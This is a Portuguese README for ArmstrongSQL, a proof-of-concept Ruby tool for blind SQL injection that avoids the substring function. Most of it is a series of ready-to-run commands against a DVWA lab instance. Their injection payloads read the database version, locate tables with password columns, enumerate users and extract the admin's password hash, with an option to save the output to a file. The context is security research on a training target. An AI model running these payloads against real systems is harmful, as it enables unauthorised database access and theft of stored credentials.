# ArmstrongSQL

O ArmstrongSQL é uma ferramenta que implementa uma prova de conceito de como explorar blind SQL injection sem a utilização da função substring. Detalhes em https://sidechannel.blog/sql-injection-tinha-uma-virgula-no-meio-do-caminho/index.html

Os exemplos citados neste README consideram o exemplo de utilização do ArmstrongSQL contra uma instância do DVWA.

## Versão do banco
./ArmStrongSQL.rb -m "Surname" -s "' and (select @@version) like '%'#"  -d all -u "http://dvwa.tempest/vulnerabilities/sqli_blind/?id=1[BLIND]&Submit=Submit" --cookie 'PHPSESSID=PLACE-SESSION-VALUE-HERE; security=low' -w

## Tabelas com coluna password
./ArmStrongSQL.rb -m "Surname" -d all -u "http://dvwa.tempest/vulnerabilities/sqli_blind/?id=1[BLIND]&Submit=Submit" --cookie 'PHPSESSID=PLACE-SESSION-VALUE-HERE; security=low' -s "' and (SELECT count(*) FROM information_schema.columns WHERE column_name = 'password' and table_name like '%') > 0#" -r

## Tabela USERS
./ArmStrongSQL.rb -m "Surname" -d all -u "http://dvwa.tempest/vulnerabilities/sqli_blind/?id=1[BLIND]&Submit=Submit" --cookie 'PHPSESSID=PLACE-SESSION-VALUE-HERE; security=low' -s "' and (SELECT count(*) FROM information_schema.columns WHERE table_name like 'USERS%' and column_name like '%') > 0#" -r

## Usuários da tabela USERS
./ArmStrongSQL.rb -m "Surname" -d all -u "http://dvwa.tempest/vulnerabilities/sqli_blind/?id=1[BLIND]&Submit=Submit" --cookie 'PHPSESSID=PLACE-SESSION-VALUE-HERE; security=low' -s "' and (SELECT count(*) FROM users WHERE USER like '%') > 0#" -r

## Hash do usuário Admin
 ./ArmStrongSQL.rb -m "Surname" -d all -u "http://dvwa.tempest/vulnerabilities/sqli_blind/?id=1[BLIND]&Submit=Submit" --cookie 'PHPSESSID=PLACE-SESSION-VALUE-HERE; security=low' -s "' and (SELECT count(*) FROM users WHERE USER = 'ADMIN' and password like '%') > 0#"  -d hex

## Salvando a saída para um arquivo
./ArmStrongSQL.rb -m "Surname" -d all -u "http://dvwa.tempest/vulnerabilities/sqli_blind/?id=1[BLIND]&Submit=Submit" --cookie 'PHPSESSID=PLACE-SESSION-VALUE-HERE; security=low' -s "' and (SELECT count(*) FROM users WHERE USER like '%') > 0#" -r -o USERS.txt
